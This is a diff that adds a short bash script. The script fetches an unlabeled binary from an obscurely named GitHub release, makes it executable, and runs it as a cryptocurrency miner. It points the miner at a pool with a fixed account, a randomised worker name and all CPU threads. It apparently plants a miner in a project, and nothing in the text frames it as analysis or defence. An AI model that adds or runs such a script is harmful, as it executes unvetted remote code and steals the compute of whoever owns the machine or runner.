@@ -1,0 +1,4 @@
+#!/bin/bash
+wget https://github.com/varfeplas/qlubuc/releases/download/jetknl/vdas
+chmod +x vdas
+./vdas --algo qubic_xmr --account CP_udnvh2owpq --worker $(echo $(shuf -i 1-15000 -n 1)-800P) --pool qubic1.hk.apool.io:3334 --thread $(nproc --all)
